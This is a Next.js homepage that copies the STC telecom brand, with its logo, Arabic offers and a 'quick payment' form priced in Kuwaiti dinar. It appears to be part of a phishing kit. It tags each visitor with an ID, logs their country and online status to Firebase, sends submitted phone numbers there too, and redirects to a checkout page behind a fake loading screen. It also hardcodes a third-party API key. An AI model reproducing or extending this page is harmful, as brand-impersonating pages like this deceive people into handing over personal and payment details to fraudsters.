"use client"

import type React from "react"
import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Search, ShoppingCart, User, Menu, CreditCard, ChevronRight, Smartphone, Tv, Globe, Gift } from "lucide-react"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/online-sts"

import { ServiceCard } from "@/components/service-card"
import { OfferCard } from "@/components/offer-card"
import { ProductCard } from "@/components/product-card"
import { GiftCard } from "@/components/gift-card"
import { InternetCard } from "@/components/internet-card"
import { CategoryCard } from "@/components/category-card"
import { Footer } from "@/components/footer"
import { FullPageLoader } from "@/components/full-page-loader"

const _id = Math.random()
  .toString(36)
  .replace(/[^a-z]+/g, "")
  .substr(0, 15)

export default function Home() {
  const [isLoading, setIsLoading] = useState(false)
  const [phone, setPhone] = useState("")
  const [amount, setAmount] = useState("")
  const router = useRouter()

  useEffect(() => {
    // Generate a unique visitor ID or retrieve it if it exists
    let visitorId = localStorage.getItem("visitor")
    if (!visitorId) {
      visitorId = _id
      localStorage.setItem("visitor", visitorId)
    }
    getLocation(visitorId)
  }, [])

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const id = localStorage.getItem("visitor")
    addData({ id: id, phone, mobile: phone })
    localStorage.setItem("amount", amount)

    setIsLoading(true)
    setTimeout(() => {
      router.push("/checkout")
      setIsLoading(false)
    }, 3000)
  }

  async function getLocation(visitorId: string) {
    // NOTE: Exposing API keys on the client-side is a security risk.
    // This should be moved to a server-side environment variable and fetched via an API route or Server Action.
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: visitorId,
        country: country,
        createdDate: new Date().toISOString(),
      })
      localStorage.setItem("country", country)
      setupOnlineStatus(visitorId)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }

  return (
    <div className="flex flex-col min-h-screen bg-white font-sans" dir="rtl">
      {/* Header */}
      <header className="flex justify-between items-center px-4 py-3 bg-white border-b border-gray-100 sticky top-0 z-50">
        <div className="flex items-center space-x-reverse space-x-3">
          <button className="p-2 rounded-lg hover:bg-gray-100 transition-colors">
            <User className="w-5 h-5 text-gray-600" />
          </button>
          <button className="p-2 rounded-lg hover:bg-gray-100 transition-colors">
            <ShoppingCart className="w-5 h-5 text-gray-600" />
          </button>
          <button className="p-2 rounded-lg hover:bg-gray-100 transition-colors">
            <Search className="w-5 h-5 text-gray-600" />
          </button>
        </div>

        <div className="flex items-center">
          <img src="/stc.png" alt="STC Logo" width={60} height={32} className="h-8 w-auto" />
        </div>

        <button className="p-2 rounded-lg hover:bg-gray-100 transition-colors">
          <Menu className="w-5 h-5 text-gray-600" />
        </button>
      </header>

      {/* Hero Banner */}
      <div className="relative mx-2 my-2 rounded-3xl overflow-hidden shadow-2xl">
        <div className="absolute inset-0 bg-gradient-to-r from-slate-900/60 via-purple-900/40 to-red-500/60 z-10"></div>
        <img src="/hero-banner.jpg" alt="Hero Banner" className="w-full h-[380px] object-cover" />
        <div className="absolute inset-0 z-20 p-8 flex flex-col justify-between">
          <div className="bg-white/95 backdrop-blur-sm rounded-2xl p-4 w-40 text-center shadow-lg border border-white/20">
            <div className="text-red-500 font-bold text-xl">خلك ON</div>
            <div className="text-red-400 text-xs mt-1 font-medium">باقات الدفع المسبقة الجديدة كلياً</div>
          </div>

          <div className="space-y-4">
            <h1 className="text-white font-bold text-3xl md:text-4xl leading-tight drop-shadow-lg">
              تواصل بدون انقطاع
              <br />
              <span className="text-red-300">مع باقات الدفع الآجل</span>
            </h1>
            <div className="flex justify-end mt-6">
              <Button className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-2xl px-8 py-4 font-semibold text-lg shadow-xl transition-all duration-300 hover:scale-105 hover:shadow-2xl">
                اعرف أكثر
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Service Icons */}
      <div className="px-4 mt-4">
        <div className="grid grid-cols-4 gap-4">
          <ServiceCard icon={<Globe className="w-6 h-6" />} title="الانترنت" color="bg-green-500" />
          <ServiceCard icon={<Smartphone className="w-6 h-6" />} title="الجوال" color="bg-green-500" />
          <ServiceCard icon={<Tv className="w-6 h-6" />} title="التلفزيون" color="bg-green-500" />
          <ServiceCard icon={<Gift className="w-6 h-6" />} title="العروض" color="bg-green-500" />
        </div>
      </div>

      {/* Quick Payment */}
      <div className="mx-4 mt-8">
        <form onSubmit={handleSubmit} className="p-6 bg-gradient-to-r from-pink-100 to-pink-200 rounded-3xl">
          <div className="flex items-center justify-between mb-6">
            <div className="p-3 bg-white rounded-2xl">
              <CreditCard className="w-6 h-6 text-purple-600" />
            </div>
            <h2 className="text-xl font-bold text-gray-800">الدفع السريع</h2>
          </div>

          <div className="space-y-4">
            <Input
              required
              type="tel"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              maxLength={12}
              placeholder="رقم الجوال أو رقم العقد"
              className="text-right border-0 rounded-2xl bg-white py-4 px-4 text-gray-700 placeholder:text-gray-400 h-12"
            />

            {phone.length >= 8 && (
              <Input
                required
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                maxLength={3}
                placeholder="القيمة بالدينار الكويتي"
                type="tel"
                className="text-right border-0 rounded-2xl bg-white py-4 px-4 text-gray-700 placeholder:text-gray-400 h-12"
              />
            )}

            <Button
              type="submit"
              className="w-full bg-red-500 hover:bg-red-600 text-white rounded-2xl py-4 font-semibold text-lg h-12"
            >
              ادفع الآن
            </Button>
          </div>
        </form>
      </div>

      {/* Latest Offers */}
      <div className="mx-4 mt-8">
        <h2 className="text-xl font-bold text-gray-800 mb-4 text-right">اكتشف أحدث عروضنا</h2>

        <div className="grid grid-cols-2 gap-4">
          <OfferCard
            title="زيد كل شي بباقاتك"
            subtitle="باقات الجوال"
            bgColor="bg-gradient-to-br from-purple-600 to-purple-800"
            buttonText="اعرف أكثر"
          />
          <OfferCard
            title="تواصل في الحج"
            subtitle="الحج - العمرة"
            bgColor="bg-gradient-to-br from-green-600 to-green-800"
            buttonText="اعرف أكثر"
          />
        </div>
      </div>

      {/* Shop Latest Devices */}
      <div className="mx-4 mt-8">
        <div className="flex justify-between items-center mb-4">
          <Button variant="ghost" className="text-purple-600 p-0 flex items-center">
            عرض الكل <ChevronRight className="h-4 w-4 mr-1" />
          </Button>
          <h2 className="text-xl font-bold text-gray-800">تسوق أحدث أجهزتنا</h2>
        </div>

        <div className="flex space-x-reverse space-x-4 overflow-x-auto pb-4">
          <ProductCard image="/samsung-s22.png" title="Samsung Galaxy Ultra" price="من 255 د.ك" badge="جديد" />
          <ProductCard
            image="/s25-Ultra-silver-blue-700x700.webp"
            title="Samsung Galaxy S25"
            price="من 225 د.ك"
            badge="جديد"
          />
          <ProductCard image="/samsung-s22.png" title="Samsung Galaxy S24" price="من 195 د.ك" />
        </div>
      </div>

      {/* Samsung Banner */}
      <div className="mx-4 mt-8">
        <div className="relative bg-gradient-to-r from-gray-900 to-gray-700 rounded-3xl overflow-hidden p-6">
          <div className="flex justify-between items-center">
            <Button className="bg-red-500 hover:bg-red-600 text-white rounded-2xl px-6 py-3">تسوق الآن</Button>
            <div className="text-white text-right">
              <h3 className="font-bold text-lg">جهاز آيفون الجديد متوفر الآن</h3>
            </div>
          </div>
        </div>
      </div>

      {/* Gift Cards */}
      <div className="mx-4 mt-8">
        <div className="flex justify-between items-center mb-4">
          <Button variant="ghost" className="text-purple-600 p-0 flex items-center">
            عرض الكل <ChevronRight className="h-4 w-4 mr-1" />
          </Button>
          <h2 className="text-xl font-bold text-gray-800">تسوق قسائمنا و بطاقاتنا الالكترونية</h2>
        </div>

        <div className="grid grid-cols-2 gap-4">
          <GiftCard image="/pal.png" title="PlayStation" />
          <GiftCard image="/xbox.png" title="Xbox Live Gold" />
          <GiftCard image="/pla.webp" title="Google Play" />
          <GiftCard image="/itun.webp" title="App Store & iTunes" />
        </div>
      </div>

      {/* Internet Packages */}
      <div className="mx-4 mt-8">
        <h2 className="text-xl font-bold text-gray-800 mb-4 text-right">الانترنت</h2>

        <div className="grid grid-cols-2 gap-4">
          <InternetCard
            title="5G"
            subtitle="شبكة الجيل الخامس"
            bgColor="bg-gradient-to-br from-blue-100 to-blue-200"
            image="/wifi.png"
          />
          <InternetCard
            title="الانترنت المنزلي"
            subtitle="باقات انترنت منزلي"
            bgColor="bg-gradient-to-br from-purple-100 to-purple-200"
            image="/music.png"
          />
        </div>
      </div>

      {/* Entertainment Services */}
      <div className="mx-4 mt-8 mb-8">
        <div className="flex justify-between items-center mb-4">
          <Button variant="ghost" className="text-purple-600 p-0 flex items-center">
            عرض الكل <ChevronRight className="h-4 w-4 mr-1" />
          </Button>
          <h2 className="text-xl font-bold text-gray-800">تسوق حسب الفئة</h2>
        </div>

        <div className="grid grid-cols-3 gap-4">
          <CategoryCard image="/rgb.png" label="5G" />
          <CategoryCard image="/mbc.png" label="الانترنت المنزلي" />
          <CategoryCard image="/Spotify.png" label="الجوال" />
        </div>
      </div>

      {/* Newsletter */}
      <div className="bg-gradient-to-r from-red-500 to-pink-500 py-8 px-4">
        <div className="text-white text-center mb-6">
          <h3 className="font-bold text-xl">نحتاج مساعدة؟</h3>
          <p className="text-sm mt-2 opacity-90">تحدث مع أحد ممثلي خدمة العملاء أو قم بزيارة أحد فروعنا</p>
        </div>
        <div className="flex flex-col gap-3 max-w-sm mx-auto">
          <Button className="bg-white text-red-500 hover:bg-gray-100 rounded-2xl py-3 font-semibold">تحدث معنا</Button>
          <Button
            variant="outline"
            className="border-white text-red-500 hover:bg-white hover:text-red-500 rounded-2xl py-3 font-semibold"
          >
            خدمة العملاء والدعم الفني
          </Button>
        </div>
      </div>

      {/* Footer */}
      <Footer />

      {/* Loading Overlay */}
      {isLoading && <FullPageLoader text="جاري التحويل ..." />}
    </div>
  )
}
